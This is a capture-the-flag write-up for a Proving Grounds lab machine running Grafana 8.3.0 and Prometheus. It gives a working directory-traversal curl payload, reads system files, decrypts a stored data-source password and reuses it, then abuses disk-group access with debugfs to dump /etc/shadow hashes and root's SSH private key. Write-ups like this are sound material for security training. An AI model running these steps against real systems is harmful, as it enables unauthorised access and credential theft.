---
machine: Fanatastic
platform: Proving Grounds
category: Linux
difficulty: Hard
tags: [grafana, directory-traversal, arbitrary-file-read, sqlite, aes-decryption, credential-reuse, disk-group, debugfs]
date: 2026-08-24
status: retired
summary: A Linux box running Grafana and Prometheus monitoring services — testing exploitation of a real-world directory-traversal/arbitrary-file-read vulnerability to pull an application database, extraction and offline AES decryption of an embedded data-source credential, and a disk-group raw-block-device read technique to steal a root SSH key for privilege escalation.
---

## Enumeration

nmap scan:

```bash
┌──(kali㉿kali)-[~/oscp/fanatastic/nmapscans]
└─$ nmap-full 192.168.117.181
[*] Running fast port discovery on 192.168.117.181...
[sudo] password for kali: 
[*] Open ports: 22,3000,9090
[*] Running full scan on 192.168.117.181...
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-24 12:49 -0400
Nmap scan report for 192.168.117.181
Host is up (0.050s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
3000/tcp open  http    Grafana http
| http-title: Grafana
|_Requested resource was /login
|_http-trane-info: Problem with XML parsing of /evox/about
| http-robots.txt: 1 disallowed entry 
|_/
9090/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
| http-title: Prometheus Time Series Collection and Processing Server
|_Requested resource was /graph
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 67.79 seconds
```

Feroxbust for Grafana:

```text
302      GET        2l        2w       29c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      119l      408w     9046c http://target:3000/public/app/plugins/panel/gettingstarted/img/icn-dashlist-panel.svg
200      GET        1l       72w     1255c http://target:3000/public/app/plugins/panel/barchart/img/barchart.svg
200      GET        9l       12w      256c http://target:3000/public/img/browserconfig.xml
200      GET       61l      328w    26966c http://target:3000/public/fonts/roboto/RxZJdnzeo3R5zSexge8UUVtXRa8TVwTICgirnJhmVJw.woff2
302      GET        2l        2w       31c http://target:3000/public => http://target:3000/public/
200      GET       12l      670w    14504c http://target:3000/public/img/grafana_mask_icon.svg
200      GET        2l       93w     5675c http://target:3000/public/build/runtime.fab5d6bbd438adca1160.js
200      GET        1l       28w     2613c http://target:3000/public/app/plugins/panel/histogram/img/histogram.svg
200      GET        1l       29w      971c http://target:3000/public/app/plugins/panel/piechart/img/icon_piechart.svg
200      GET        1l       86w     2779c http://target:3000/public/app/plugins/panel/dashlist/img/icn-dashlist-panel.svg
200      GET        1l       48w     2059c http://target:3000/public/app/plugins/panel/alertlist/img/icn-singlestat-panel.svg
200      GET        1l       33w      985c http://target:3000/public/app/plugins/panel/text/img/icn-text-panel.svg
200      GET        1l       52w     2419c http://target:3000/public/app/plugins/panel/logs/img/icn-logs-panel.svg
200      GET        1l       43w     2493c http://target:3000/public/app/plugins/panel/geomap/img/icn-geomap.svg
200      GET       57l      104w     5690c http://target:3000/public/img/grafana_icon.svg

```

Feroxbust for Prometheus:

```text
404      GET        1l        4w       19c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        2l        3w       40c http://target:9090/new => http://target:9090/new/
302      GET        2l        2w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        1l       71w     2347c http://target:9090/graph
302      GET        2l        2w       29c http://target:9090/ => http://target:9090/graph
200      GET        1l        1w      178c http://target:9090/version
301      GET        2l        3w       43c http://target:9090/static => http://target:9090/static/
200      GET        6l      301w    11916c http://target:9090/static/css/2.cede384b.chunk.css
200      GET       15l       32w      318c http://target:9090/manifest.json
301      GET        0l        0w        0c http://target:9090/static/css/ => css/
301      GET        0l        0w        0c http://target:9090/static/js/ => js/
301      GET        0l        0w        0c http://target:9090/static/media => media/
200      GET        3l       15w    35820c http://target:9090/favicon.ico
200      GET        1l       71w     2347c http://target:9090/rules
200      GET        1l       71w     2347c http://target:9090/alerts
200      GET        2l     4681w   236032c http://target:9090/static/js/main.a00f3aa4.chunk.js
200      GET        1l       71w     2347c http://target:9090/status
200      GET        2l    10296w   399394c http://target:9090/static/css/main.ac88b532.chunk.css
301      GET        0l        0w        0c http://target:9090/static/css => css/
200      GET        3l    50514w  1460384c http://target:9090/static/js/2.75f1d0f1.chunk.js
200      GET        1l       71w     2347c http://target:9090/flags
301      GET        0l        0w        0c http://target:9090/static/js => js/
200      GET        1l       71w     2347c http://target:9090/config
301      GET        2l        3w       40c http://target:9090/New => http://target:9090/new/
301      GET        2l        3w       51c http://target:9090/classic/static => http://target:9090/classic/static/
301      GET        0l        0w        0c http://target:9090/classic/static/img => img/
200      GET      106l      234w     6291c http://target:9090/classic/graph
200      GET      329l      426w     9885c http://target:9090/classic/flags
200      GET      105l      245w     5224c http://target:9090/classic/alerts
200      GET       86l      175w     4119c http://target:9090/classic/rules
200      GET      417l      602w    12680c http://target:9090/classic/status
301      GET        0l        0w        0c http://target:9090/classic/static/css => css/
301      GET        0l        0w        0c http://target:9090/classic/static/js => js/
200      GET       94l      203w     4512c http://target:9090/classic/config
301      GET        0l        0w        0c http://target:9090/classic/static/vendor => vendor/
302      GET        2l        3w       26c http://target:9090/new/%20 => http://target:9090/%20?
302      GET        2l        3w       27c http://target:9090/new/%20~ => http://target:9090/%20~?
302      GET        2l        3w       30c http://target:9090/new/%20.bak => http://target:9090/%20.bak?
302      GET        2l        3w       31c http://target:9090/new/%20.bak2 => http://target:9090/%20.bak2?
302      GET        2l        3w       30c http://target:9090/new/%20.old => http://target:9090/%20.old?
302      GET        2l        3w       28c http://target:9090/new/%20.1 => http://target:9090/%20.1?
302      GET        2l        3w       31c http://target:9090/new/.%20.swp => http://target:9090/.%20.swp?
302      GET        2l        3w       31c http://target:9090/new/%20.json => http://target:9090/%20.json?
302      GET        2l        3w       32c http://target:9090/new/%20.json~ => http://target:9090/%20.json~?
302      GET        2l        3w       35c http://target:9090/new/%20.json.bak => http://target:9090/%20.json.bak?
302      GET        2l        3w       36c http://target:9090/new/%20.json.bak2 => http://target:9090/%20.json.bak2?
302      GET        2l        3w       35c http://target:9090/new/%20.json.old => http://target:9090/%20.json.old?
302      GET        2l        3w       33c http://target:9090/new/%20.json.1 => http://target:9090/%20.json.1?
302      GET        2l        3w       36c http://target:9090/new/.%20.json.swp => http://target:9090/.%20.json.swp?
302      GET        2l        3w       29c http://target:9090/new/%20.js => http://target:9090/%20.js?
302      GET        2l        3w       30c http://target:9090/new/%20.js~ => http://target:9090/%20.js~?
302      GET        2l        3w       33c http://target:9090/new/%20.js.bak => http://target:9090/%20.js.bak?
302      GET        2l        3w       34c http://target:9090/new/%20.js.bak2 => http://target:9090/%20.js.bak2?
302      GET        2l        3w       33c http://target:9090/new/%20.js.old => http://target:9090/%20.js.old?
302      GET        2l        3w       31c http://target:9090/new/%20.js.1 => http://target:9090/%20.js.1?
302      GET        2l        3w       34c http://target:9090/new/.%20.js.swp => http://target:9090/.%20.js.swp?
301      GET        2l        3w       40c http://target:9090/NEW => http://target:9090/new/
301      GET        2l        3w       42c http://target:9090/debug => http://target:9090/debug/
301      GET        0l        0w        0c http://target:9090/classic/static/vendor/js => js/
301      GET        2l        3w       45c http://target:9090/consoles => http://target:9090/consoles/

```

By navigating to: `http://target:9090/classic/status` we can see that the build version is `2.32.1`

After doing some online research we don't see a clear useful exploit for this version

We can find our Grafana build by finding the following in `http://target:3000/metrics` which I found after seeing that prometheus had a job running on the /metrics endpoint:

```text
grafana_build_info{branch="HEAD",edition="oss",goversion="go1.17.2",revision="914fcedb72",version="8.3.0"} 1
```

## Foothold

We can find the following exploit for this version:

```bash
┌──(kali㉿kali)-[~/oscp/fanatastic/nmapscans]
└─$ searchsploit grafana 8.3.0
------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                          |  Path
------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Grafana 8.3.0 - Directory Traversal and Arbitrary File Read                                                             | multiple/webapps/50581.py
```

We can use this exploit to LFI /etc/passwd:

```bash
┌──(kali㉿kali)-[~/oscp/fanatastic]
└─$ python3 50581.py -H http://192.168.117.181:3000                                                                                                 
Read file > /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
grafana:x:113:117::/usr/share/grafana:/bin/false
prometheus:x:1000:1000::/home/prometheus:/bin/false
sysadmin:x:1001:1001::/home/sysadmin:/bin/sh
```

If we read `/etc/grafana/grafana.ini`:

```text
#################################### Security ####################################
[security]
# disable creation of admin user on first start of grafana
;disable_initial_admin_creation = false

# default admin user, created on startup
;admin_user = admin

# default admin password, can be changed before first start of grafana,  or in profile settings
;admin_password = admin

# used for signing
;secret_key = SW2YcwTIb9zpOOhoPsMm
```

We can use curl to download the sqlite3 grafana.db:

```bash
curl --path-as-is http://target:3000/public/plugins/prometheus/../../../../../../../../var/lib/grafana/grafana.db -o grafana.db
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
100 748.0k 100 748.0k   0      0  1.16M      0                              0
```

After exploring the database tables we eventually find this encrypted password for our sysadmin user:

```text
sqlite> select basic_auth_user, secure_json_data from data_source;
╭─────────────────┬──────────────────────────────────────────────────────────────────────────────────────╮
│ basic_auth_user │                                   secure_json_data                                   │
╞═════════════════╪══════════════════════════════════════════════════════════════════════════════════════╡
│ sysadmin        │ {"basicAuthPassword":"anBneWFNQ2z+IDGhz3a7wxaqjimuglSXTeMvhbvsveZwVzreNJSw+hsV4w=="} │
╰─────────────────┴──────────────────────────────────────────────────────────────────────────────────────╯
```

After some research on Grafana and its password storage, I find that it uses AES and requires the encrypted password and decryption key to decrypt. Fortunately, we find `secret_key` earlier in `grafana.ini`

I found a python grafana password decryptor tool online: https://github.com/Strikoder-Premium/Grafana-Password-Decryptor

We can decrypt the password by using the exploit with the following parameters, setting the encrypted password as `-hash` though a cryptographic hash is technically impossible to decrypt:

```bash
┌──(kali㉿kali)-[~/oscp/fanatastic]
└─$ python3 AESDecrypt.py -hash anBneWFNQ2z+IDGhz3a7wxaqjimuglSXTeMvhbvsveZwVzreNJSw+hsV4w== -k SW2YcwTIb9zpOOhoPsMm

╔═══════════════════════════════════════════════════════╗
║     Grafana Data Source Password Decryptor            ║
║              Coded by: strikoder                      ║
╚═══════════════════════════════════════════════════════╝

[*] Using provided secret key: SW2YcwTIb9zpOOhoPsMm

============================================================
/home/kali/oscp/fanatastic/AESDecrypt.py:43: CryptographyDeprecationWarning: CFB has been moved to cryptography.hazmat.decrepit.ciphers.modes.CFB and will be removed from cryptography.hazmat.primitives.ciphers.modes in 49.0.0.
  modes.CFB(iv),

Encrypted: anBneWFNQ2z+IDGhz3a7wxaqjimuglSXTeMvhbvsveZwVzreNJSw+hsV4w==
Decrypted: SuperSecureP@ssw0rd

============================================================
```

This gives us credpair: `sysadmin:SuperSecureP@ssw0rd`

We can use this credpair to sign into ssh:

```bash
┌──(kali㉿kali)-[~/oscp/fanatastic]
└─$ ssh sysadmin@target           
The authenticity of host 'target (192.168.117.181)' can't be established.
ED25519 key fingerprint is: SHA256:D9EwlP6OBofTctv3nJ2YrEmwQrTfB9lLe4l8CqvcVDI
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'target' (ED25519) to the list of known hosts.
sysadmin@target's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-97-generic x86_64)

$ whoami
sysadmin
```

We can gather local.txt from `sysadmin`'s home directory.

## Privilege Escalation

```text
╔══════════╣ My user (T1033)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#users                                                                 
uid=1001(sysadmin) gid=1001(sysadmin) groups=1001(sysadmin),6(disk)                                                                           
```

```bash
sysadmin@fanatastic:/dev/shm$ groups
sysadmin disk
sysadmin@fanatastic:/dev/shm$ find / -group disk -perm /g=w 2>/dev/null
/dev/btrfs-control
/dev/sda2
/dev/sda1
/dev/sg0
/dev/sda
/dev/loop7
/dev/loop6
/dev/loop5
/dev/loop4
/dev/loop3
/dev/loop2
/dev/loop1
/dev/loop0
/dev/loop-control
sysadmin@fanatastic:/dev/shm$ lsblk
NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
loop0    7:0    0 61.9M  1 loop /snap/core20/1328
loop1    7:1    0 67.2M  1 loop /snap/lxd/21835
loop2    7:2    0 55.4M  1 loop /snap/core18/2128
loop3    7:3    0 55.5M  1 loop /snap/core18/2284
loop4    7:4    0 70.3M  1 loop /snap/lxd/21029
loop5    7:5    0 32.3M  1 loop /snap/snapd/12883
loop6    7:6    0 43.4M  1 loop /snap/snapd/14549
sda      8:0    0   10G  0 disk 
├─sda1   8:1    0    1M  0 part 
└─sda2   8:2    0   10G  0 part /
sr0     11:0    1 1024M  0 rom  

```

We can use `debugfs` to read /dev/sda2, our primary data drive, bypassing normal read permission restrictions:

```bash
debugfs /dev/sda2

debugfs:  cat /etc/shadow
root:$6$mAe2JsSJSmg1n45O$78rgk3B6HaklRIPcLOtwP9aX5i.0aPF16NVm39i1cz3K7StTajlI2LFBp.WSxiAAyoB4SQd5qc123HVmH0HXJ/:19052:0:99999:7:::
daemon:*:18474:0:99999:7:::
bin:*:18474:0:99999:7:::
sys:*:18474:0:99999:7:::
sync:*:18474:0:99999:7:::
games:*:18474:0:99999:7:::
man:*:18474:0:99999:7:::
lp:*:18474:0:99999:7:::
mail:*:18474:0:99999:7:::
news:*:18474:0:99999:7:::
uucp:*:18474:0:99999:7:::
proxy:*:18474:0:99999:7:::
www-data:*:18474:0:99999:7:::
backup:*:18474:0:99999:7:::
list:*:18474:0:99999:7:::
irc:*:18474:0:99999:7:::
gnats:*:18474:0:99999:7:::
nobody:*:18474:0:99999:7:::
systemd-network:*:18474:0:99999:7:::
systemd-resolve:*:18474:0:99999:7:::
systemd-timesync:*:18474:0:99999:7:::
messagebus:*:18474:0:99999:7:::
syslog:*:18474:0:99999:7:::
_apt:*:18474:0:99999:7:::
tss:*:18474:0:99999:7:::
uuidd:*:18474:0:99999:7:::
tcpdump:*:18474:0:99999:7:::
landscape:*:18474:0:99999:7:::
pollinate:*:18474:0:99999:7:::
sshd:*:18634:0:99999:7:::
systemd-coredump:!!:18634::::::
lxd:!:18634::::::
usbmux:*:18864:0:99999:7:::
grafana:*:19027:0:99999:7:::
prometheus:!:19027:0:99999:7:::
sysadmin:$6$dpIlzNJI20lx.1rY$42EDl48wSZPsE0rcdqwraFS9ZXCPPLzS4wW4CbJqV4hBuuDWya39YSK0CGIYzaJIWg.vtEQn7615Dqs30eb4/0:19027:0:99999:7:::
```

We can also read our proof.txt flag from here:

```bash
debugfs:  cat /root/proof.txt
248fa555df7...
```

We want a root shell though. If we read /root we find:

```text
 524291  (12) .    2  (12) ..    534658  (12) .ssh    534750  (12) snap   
 525673  (16) .bashrc    525674  (16) .profile    531229  (24) .bash_history   
 525323  (16) .cache    534664  (128) .local    541787  (84) .wget-hsts   
 533995  (3752) proof.txt 
```

The .ssh directory implies there may be a private key we could steal to ssh in as root.

If we `ls` the `.ssh` directory we find:

```text
 534658  (12) .    524291  (12) ..    534659  (24) authorized_keys   
 534576  (16) id_rsa    541822  (4020) id_rsa.pub
```

We can read the private key `id_rsa`:

```bash
debugfs:  cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
T3skewpHe8tDUAAAALcm9vdEB1YnVudHU=
-----END OPENSSH PRIVATE KEY-----
```

We can save this locally, chmod 700 it, and use it as a private key to auth to the box as root:

```bash
┌──(kali㉿kali)-[~/oscp/fanatastic]
└─$ mousepad priv

┌──(kali㉿kali)-[~/oscp/fanatastic]
└─$ chmod 700 priv

┌──(kali㉿kali)-[~/oscp/fanatastic]
└─$ ssh -i priv root@target                 

root@fanatastic:~# whoami
root
```

Box is rooted!
